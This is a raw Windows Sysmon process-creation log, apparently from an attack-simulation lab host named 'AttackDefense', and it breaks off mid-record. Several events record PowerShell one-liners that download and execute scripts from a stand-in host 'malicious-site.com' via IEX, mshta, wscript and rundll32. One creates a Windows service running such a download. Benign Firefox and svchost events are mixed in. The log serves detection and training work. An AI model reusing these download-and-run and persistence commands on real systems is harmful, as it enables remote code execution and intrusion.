<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2023-03-10T10:54:12.474329500Z'/><EventRecordID>1406</EventRecordID><Correlation/><Execution ProcessID='2472' ThreadID='3180'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>AttackDefense</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2023-03-10 10:54:12.473</Data><Data Name='ProcessGuid'>{221ce7aa-0c54-640b-a301-00000000dd00}</Data><Data Name='ProcessId'>3284</Data><Data Name='Image'>C:\Windows\System32\sc.exe</Data><Data Name='FileVersion'>10.0.17763.1 (WinBuild.160101.0800)</Data><Data Name='Description'>Service Control Manager Configuration Tool</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>sc.exe</Data><Data Name='CommandLine'>"C:\Windows\system32\sc.exe" create MyService binPath= "C:\Windows\System32\cmd.exe /c powershell.exe -c IEX ((New-Object Net.WebClient).DownloadString(" https://malicious-site.com/malware.ps1))</Data><Data Name='CurrentDirectory'>C:\Users\Administrator\</Data><Data Name='User'>ATTACKDEFENSE\Administrator</Data><Data Name='LogonGuid'>{221ce7aa-6da3-6409-795a-050000000000}</Data><Data Name='LogonId'>0x55a79</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=ABB56882148DE65D53ABFC55544A49A8,SHA256=78097C7CD0E57902536C60B7FA17528C313DB20869E5F944223A0BA4C801D39B,IMPHASH=35A7FFDE18D444A92D32C8B2879450FF</Data><Data Name='ParentProcessGuid'>{221ce7aa-0c54-640b-a201-00000000dd00}</Data><Data Name='ParentProcessId'>4248</Data><Data Name='ParentImage'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='ParentCommandLine'>"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "sc.exe create MyService binPath= 'C:\Windows\System32\cmd.exe /c powershell.exe -c IEX ((New-Object Net.WebClient).DownloadString('https://malicious-site.com/malware.ps1'))'"</Data><Data Name='ParentUser'>ATTACKDEFENSE\Administrator</Data></EventData></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2023-03-10T10:52:00.252310300Z'/><EventRecordID>1394</EventRecordID><Correlation/><Execution ProcessID='2472' ThreadID='3180'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>AttackDefense</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2023-03-10 10:52:00.250</Data><Data Name='ProcessGuid'>{221ce7aa-0bd0-640b-9b01-00000000dd00}</Data><Data Name='ProcessId'>4628</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='FileVersion'>10.0.17763.1 (WinBuild.160101.0800)</Data><Data Name='Description'>Windows PowerShell</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>PowerShell.EXE</Data><Data Name='CommandLine'>"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "=(New-Object Net.WebClient).DownloadString('https://malicious-site.com/malware.hta');mshta.exe \" javascript:IEX </Data><Data Name='CurrentDirectory'>C:\Users\Administrator\</Data><Data Name='User'>ATTACKDEFENSE\Administrator</Data><Data Name='LogonGuid'>{221ce7aa-6da3-6409-795a-050000000000}</Data><Data Name='LogonId'>0x55a79</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=7353F60B1739074EB17C5F4DDDEFE239,SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F</Data><Data Name='ParentProcessGuid'>{221ce7aa-09c1-640b-8d01-00000000dd00}</Data><Data Name='ParentProcessId'>4956</Data><Data Name='ParentImage'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='ParentCommandLine'>"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" </Data><Data Name='ParentUser'>ATTACKDEFENSE\Administrator</Data></EventData></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2023-03-10T10:45:19.322640500Z'/><EventRecordID>1380</EventRecordID><Correlation/><Execution ProcessID='2472' ThreadID='3180'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>AttackDefense</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2023-03-10 10:45:19.321</Data><Data Name='ProcessGuid'>{221ce7aa-0a3f-640b-9401-00000000dd00}</Data><Data Name='ProcessId'>1008</Data><Data Name='Image'>C:\Windows\System32\sc.exe</Data><Data Name='FileVersion'>10.0.17763.1 (WinBuild.160101.0800)</Data><Data Name='Description'>Service Control Manager Configuration Tool</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>sc.exe</Data><Data Name='CommandLine'>"C:\Windows\system32\sc.exe" create MyService binPath= "C:\Windows\System32\cmd.exe /c powershell.exe -c IEX ((New-Object Net.WebClient).DownloadString(" https://malicious-site.com/malware.ps1))</Data><Data Name='CurrentDirectory'>C:\Users\Administrator\</Data><Data Name='User'>ATTACKDEFENSE\Administrator</Data><Data Name='LogonGuid'>{221ce7aa-6da3-6409-795a-050000000000}</Data><Data Name='LogonId'>0x55a79</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=ABB56882148DE65D53ABFC55544A49A8,SHA256=78097C7CD0E57902536C60B7FA17528C313DB20869E5F944223A0BA4C801D39B,IMPHASH=35A7FFDE18D444A92D32C8B2879450FF</Data><Data Name='ParentProcessGuid'>{221ce7aa-0a3f-640b-9301-00000000dd00}</Data><Data Name='ParentProcessId'>4872</Data><Data Name='ParentImage'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='ParentCommandLine'>"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "sc.exe create MyService binPath= 'C:\Windows\System32\cmd.exe /c powershell.exe -c IEX ((New-Object Net.WebClient).DownloadString('https://malicious-site.com/malware.ps1'))'"</Data><Data Name='ParentUser'>ATTACKDEFENSE\Administrator</Data></EventData></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2023-03-10T10:45:37.362912300Z'/><EventRecordID>1381</EventRecordID><Correlation/><Execution ProcessID='2472' ThreadID='3180'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>AttackDefense</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2023-03-10 10:45:37.360</Data><Data Name='ProcessGuid'>{221ce7aa-0a51-640b-9501-00000000dd00}</Data><Data Name='ProcessId'>1992</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='FileVersion'>10.0.17763.1 (WinBuild.160101.0800)</Data><Data Name='Description'>Windows PowerShell</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>PowerShell.EXE</Data><Data Name='CommandLine'>"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "mshta.exe javascript:IEX((New-Object Net.WebClient).DownloadString('https://malicious-site.com/malware.hta'))"</Data><Data Name='CurrentDirectory'>C:\Users\Administrator\</Data><Data Name='User'>ATTACKDEFENSE\Administrator</Data><Data Name='LogonGuid'>{221ce7aa-6da3-6409-795a-050000000000}</Data><Data Name='LogonId'>0x55a79</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=7353F60B1739074EB17C5F4DDDEFE239,SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F</Data><Data Name='ParentProcessGuid'>{221ce7aa-09c1-640b-8d01-00000000dd00}</Data><Data Name='ParentProcessId'>4956</Data><Data Name='ParentImage'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='ParentCommandLine'>"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" </Data><Data Name='ParentUser'>ATTACKDEFENSE\Administrator</Data></EventData></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2023-03-10T10:45:16.982801000Z'/><EventRecordID>1377</EventRecordID><Correlation/><Execution ProcessID='2472' ThreadID='3180'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>AttackDefense</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2023-03-10 10:45:16.981</Data><Data Name='ProcessGuid'>{221ce7aa-0a3c-640b-9201-00000000dd00}</Data><Data Name='ProcessId'>1948</Data><Data Name='Image'>C:\Windows\System32\rundll32.exe</Data><Data Name='FileVersion'>10.0.17763.1 (WinBuild.160101.0800)</Data><Data Name='Description'>Windows host process (Rundll32)</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>RUNDLL32.EXE</Data><Data Name='CommandLine'>"C:\Windows\System32\rundll32.exe" malicious.dll,EntryPoint</Data><Data Name='CurrentDirectory'>C:\Users\Administrator\</Data><Data Name='User'>ATTACKDEFENSE\Administrator</Data><Data Name='LogonGuid'>{221ce7aa-6da3-6409-795a-050000000000}</Data><Data Name='LogonId'>0x55a79</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=C73BA51880F5A7FB20C84185A23212EF,SHA256=01B407AF0200B66A34D9B1FA6D9EAAB758EFA36A36BB99B554384F59F8690B1A,IMPHASH=F27A7FC3A53E74F45BE370131953896A</Data><Data Name='ParentProcessGuid'>{221ce7aa-0a27-640b-9101-00000000dd00}</Data><Data Name='ParentProcessId'>3468</Data><Data Name='ParentImage'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='ParentCommandLine'>"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "IEX ((New-Object Net.WebClient).DownloadString('https://malicious-site.com/malware.ps1'));[System.Diagnostics.Process]::Start('rundll32.exe', 'malicious.dll,EntryPoint')"</Data><Data Name='ParentUser'>ATTACKDEFENSE\Administrator</Data></EventData></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2023-03-10T10:45:19.105866800Z'/><EventRecordID>1378</EventRecordID><Correlation/><Execution ProcessID='2472' ThreadID='3180'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>AttackDefense</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2023-03-10 10:45:19.103</Data><Data Name='ProcessGuid'>{221ce7aa-0a3f-640b-9301-00000000dd00}</Data><Data Name='ProcessId'>4872</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='FileVersion'>10.0.17763.1 (WinBuild.160101.0800)</Data><Data Name='Description'>Windows PowerShell</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>PowerShell.EXE</Data><Data Name='CommandLine'>"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "sc.exe create MyService binPath= 'C:\Windows\System32\cmd.exe /c powershell.exe -c IEX ((New-Object Net.WebClient).DownloadString('https://malicious-site.com/malware.ps1'))'"</Data><Data Name='CurrentDirectory'>C:\Users\Administrator\</Data><Data Name='User'>ATTACKDEFENSE\Administrator</Data><Data Name='LogonGuid'>{221ce7aa-6da3-6409-795a-050000000000}</Data><Data Name='LogonId'>0x55a79</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=7353F60B1739074EB17C5F4DDDEFE239,SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F</Data><Data Name='ParentProcessGuid'>{221ce7aa-09c1-640b-8d01-00000000dd00}</Data><Data Name='ParentProcessId'>4956</Data><Data Name='ParentImage'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='ParentCommandLine'>"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" </Data><Data Name='ParentUser'>ATTACKDEFENSE\Administrator</Data></EventData></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2023-03-10T10:46:01.345013400Z'/><EventRecordID>1384</EventRecordID><Correlation/><Execution ProcessID='2472' ThreadID='3180'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>AttackDefense</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2023-03-10 10:46:01.336</Data><Data Name='ProcessGuid'>{221ce7aa-0a69-640b-9601-00000000dd00}</Data><Data Name='ProcessId'>1660</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='FileVersion'>10.0.17763.1 (WinBuild.160101.0800)</Data><Data Name='Description'>Windows PowerShell</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>PowerShell.EXE</Data><Data Name='CommandLine'>"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "IEX ((New-Object Net.WebClient).DownloadString('https://malicious-site.com/malware.vbs'));C:\Windows\System32\wscript.exe C:\Users\username\AppData\Roaming\malware.vbs"</Data><Data Name='CurrentDirectory'>C:\Users\Administrator\</Data><Data Name='User'>ATTACKDEFENSE\Administrator</Data><Data Name='LogonGuid'>{221ce7aa-6da3-6409-795a-050000000000}</Data><Data Name='LogonId'>0x55a79</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=7353F60B1739074EB17C5F4DDDEFE239,SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F</Data><Data Name='ParentProcessGuid'>{221ce7aa-09c1-640b-8d01-00000000dd00}</Data><Data Name='ParentProcessId'>4956</Data><Data Name='ParentImage'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='ParentCommandLine'>"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" </Data><Data Name='ParentUser'>ATTACKDEFENSE\Administrator</Data></EventData></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2023-03-10T10:48:41.665146400Z'/><EventRecordID>1389</EventRecordID><Correlation/><Execution ProcessID='2472' ThreadID='3180'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>AttackDefense</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2023-03-10 10:48:41.663</Data><Data Name='ProcessGuid'>{221ce7aa-0b09-640b-9901-00000000dd00}</Data><Data Name='ProcessId'>4936</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='FileVersion'>10.0.17763.1 (WinBuild.160101.0800)</Data><Data Name='Description'>Windows PowerShell</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>PowerShell.EXE</Data><Data Name='CommandLine'>"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "mshta.exe javascript:IEX((New-Object Net.WebClient).DownloadString('https://malicious-site.com/malware.hta'))"</Data><Data Name='CurrentDirectory'>C:\Users\Administrator\</Data><Data Name='User'>ATTACKDEFENSE\Administrator</Data><Data Name='LogonGuid'>{221ce7aa-6da3-6409-795a-050000000000}</Data><Data Name='LogonId'>0x55a79</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=7353F60B1739074EB17C5F4DDDEFE239,SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F</Data><Data Name='ParentProcessGuid'>{221ce7aa-09c1-640b-8d01-00000000dd00}</Data><Data Name='ParentProcessId'>4956</Data><Data Name='ParentImage'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='ParentCommandLine'>"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" </Data><Data Name='ParentUser'>ATTACKDEFENSE\Administrator</Data></EventData></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2023-03-10T10:51:05.936639200Z'/><EventRecordID>1393</EventRecordID><Correlation/><Execution ProcessID='2472' ThreadID='3180'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>AttackDefense</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2023-03-10 10:51:05.935</Data><Data Name='ProcessGuid'>{221ce7aa-0b99-640b-9a01-00000000dd00}</Data><Data Name='ProcessId'>3156</Data><Data Name='Image'>C:\Windows\System32\taskhostw.exe</Data><Data Name='FileVersion'>10.0.17763.831 (WinBuild.160101.0800)</Data><Data Name='Description'>Host Process for Windows Tasks</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>taskhostw.exe</Data><Data Name='CommandLine'>taskhostw.exe NGCKeyPregen</Data><Data Name='CurrentDirectory'>C:\Windows\system32\</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data><Data Name='LogonGuid'>{221ce7aa-6c88-6409-e703-000000000000}</Data><Data Name='LogonId'>0x3e7</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>System</Data><Data Name='Hashes'>MD5=106B2AEC107DFD22DB51C7A1B29623F8,SHA256=CA620F4DE4A426F129445E4D8A545B7B08B021080E7375A3EA3ED8C8A7212A8F,IMPHASH=9839C7FD9649496B162F72128209528A</Data><Data Name='ParentProcessGuid'>{00000000-0000-0000-0000-000000000000}</Data><Data Name='ParentProcessId'>1464</Data><Data Name='ParentImage'>-</Data><Data Name='ParentCommandLine'>-</Data><Data Name='ParentUser'>-</Data></EventData></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2023-03-10T10:46:23.188203000Z'/><EventRecordID>1387</EventRecordID><Correlation/><Execution ProcessID='2472' ThreadID='3180'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>AttackDefense</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2023-03-10 10:46:23.182</Data><Data Name='ProcessGuid'>{221ce7aa-0a7f-640b-9701-00000000dd00}</Data><Data Name='ProcessId'>2692</Data><Data Name='Image'>C:\Windows\System32\wscript.exe</Data><Data Name='FileVersion'>5.812.10240.16384</Data><Data Name='Description'>Microsoft ® Windows Based Script Host</Data><Data Name='Product'>Microsoft ® Windows Script Host</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>wscript.exe</Data><Data Name='CommandLine'>"C:\Windows\System32\wscript.exe" C:\Users\username\AppData\Roaming\malware.vbs</Data><Data Name='CurrentDirectory'>C:\Users\Administrator\</Data><Data Name='User'>ATTACKDEFENSE\Administrator</Data><Data Name='LogonGuid'>{221ce7aa-6da3-6409-795a-050000000000}</Data><Data Name='LogonId'>0x55a79</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=F5E5DF6C9D62F4E940B334954A2046FC,SHA256=47CACD60D91441137D055184614B1A418C0457992977857A76CA05C75BBC1B56,IMPHASH=0F71D5F6F4CBB935CE1B09754102419C</Data><Data Name='ParentProcessGuid'>{221ce7aa-0a69-640b-9601-00000000dd00}</Data><Data Name='ParentProcessId'>1660</Data><Data Name='ParentImage'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='ParentCommandLine'>"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "IEX ((New-Object Net.WebClient).DownloadString('https://malicious-site.com/malware.vbs'));C:\Windows\System32\wscript.exe C:\Users\username\AppData\Roaming\malware.vbs"</Data><Data Name='ParentUser'>ATTACKDEFENSE\Administrator</Data></EventData></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2023-03-10T10:47:40.984419300Z'/><EventRecordID>1388</EventRecordID><Correlation/><Execution ProcessID='2472' ThreadID='3180'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>AttackDefense</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2023-03-10 10:47:40.982</Data><Data Name='ProcessGuid'>{221ce7aa-0acc-640b-9801-00000000dd00}</Data><Data Name='ProcessId'>284</Data><Data Name='Image'>C:\Windows\System32\at.exe</Data><Data Name='FileVersion'>10.0.17763.1 (WinBuild.160101.0800)</Data><Data Name='Description'>Schedule service command line interface</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>AT.EXE</Data><Data Name='CommandLine'>"C:\Windows\system32\at.exe" line:1 char:1</Data><Data Name='CurrentDirectory'>C:\Users\Administrator\</Data><Data Name='User'>ATTACKDEFENSE\Administrator</Data><Data Name='LogonGuid'>{221ce7aa-6da3-6409-795a-050000000000}</Data><Data Name='LogonId'>0x55a79</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=F4416891D11BBA6975E5067FA10507C8,SHA256=73A9A6A4C9CF19FCD117EB3C430E1C9ACADED31B42875BA4F02FA61DA1B8A6DC,IMPHASH=FA9A9B0D471E4B5F3683C346C3D880BD</Data><Data Name='ParentProcessGuid'>{221ce7aa-09c1-640b-8d01-00000000dd00}</Data><Data Name='ParentProcessId'>4956</Data><Data Name='ParentImage'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='ParentCommandLine'>"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" </Data><Data Name='ParentUser'>ATTACKDEFENSE\Administrator</Data></EventData></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2023-03-10T10:59:42.793235700Z'/><EventRecordID>1409</EventRecordID><Correlation/><Execution ProcessID='2472' ThreadID='3180'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>AttackDefense</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2023-03-10 10:59:42.792</Data><Data Name='ProcessGuid'>{221ce7aa-0d9e-640b-a601-00000000dd00}</Data><Data Name='ProcessId'>1992</Data><Data Name='Image'>C:\Program Files\Mozilla Firefox\firefox.exe</Data><Data Name='FileVersion'>110.0.1</Data><Data Name='Description'>Firefox</Data><Data Name='Product'>Firefox</Data><Data Name='Company'>Mozilla Corporation</Data><Data Name='OriginalFileName'>firefox.exe</Data><Data Name='CommandLine'>"C:\Program Files\Mozilla Firefox\firefox.exe" -contentproc --channel="5012.0.66216790\1317527749" -parentBuildID 20230227191043 -prefsHandle 1980 -prefMapHandle 1972 -prefsLen 19724 -prefMapSize 232889 -win32kLockedDown -appDir "C:\Program Files\Mozilla Firefox\browser" - {e87804b1-aa1d-487f-b455-33fbfbcc61cb} 5012 "\\.\pipe\gecko-crash-server-pipe.5012" 2056 3a69558 socket</Data><Data Name='CurrentDirectory'>C:\ProgramData\Mozilla-1de4eec8-1241-4177-a864-e594e8d1fb38\updates\308046B0AF4A39CB\</Data><Data Name='User'>ATTACKDEFENSE\Administrator</Data><Data Name='LogonGuid'>{221ce7aa-6da3-6409-795a-050000000000}</Data><Data Name='LogonId'>0x55a79</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>Low</Data><Data Name='Hashes'>MD5=AB63396CB0774AC41107B7B112F81D5A,SHA256=9A43C57F3E98BD69789E8CCBEEF2C1B6B5A3B1D06D63257BB4BD58DFFA23689D,IMPHASH=D1B34C85804B0561CB140EC571B3DE8B</Data><Data Name='ParentProcessGuid'>{221ce7aa-0d9e-640b-a501-00000000dd00}</Data><Data Name='ParentProcessId'>5012</Data><Data Name='ParentImage'>C:\Program Files\Mozilla Firefox\firefox.exe</Data><Data Name='ParentCommandLine'>"C:\Program Files\Mozilla Firefox\firefox.exe" --MOZ_LOG sync,prependheader,timestamp,append,maxsize:1,Dump:5 --MOZ_LOG_FILE C:\ProgramData\Mozilla-1de4eec8-1241-4177-a864-e594e8d1fb38\updates\308046B0AF4A39CB\backgroundupdate.moz_log --backgroundtask backgroundupdate</Data><Data Name='ParentUser'>ATTACKDEFENSE\Administrator</Data></EventData></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2023-03-10T15:22:18.956868200Z'/><EventRecordID>1444</EventRecordID><Correlation/><Execution ProcessID='2472' ThreadID='3180'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>AttackDefense</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2023-03-10 15:22:18.954</Data><Data Name='ProcessGuid'>{221ce7aa-4b2a-640b-b301-00000000dd00}</Data><Data Name='ProcessId'>1932</Data><Data Name='Image'>C:\Windows\System32\svchost.exe</Data><Data Name='FileVersion'>10.0.17763.1 (WinBuild.160101.0800)</Data><Data Name='Description'>Host Process for Windows Services</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>svchost.exe</Data><Data Name='CommandLine'>C:\Windows\System32\svchost.exe -k netsvcs -p -s NetSetupSvc</Data><Data Name='CurrentDirectory'>C:\Windows\system32\</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data><Data 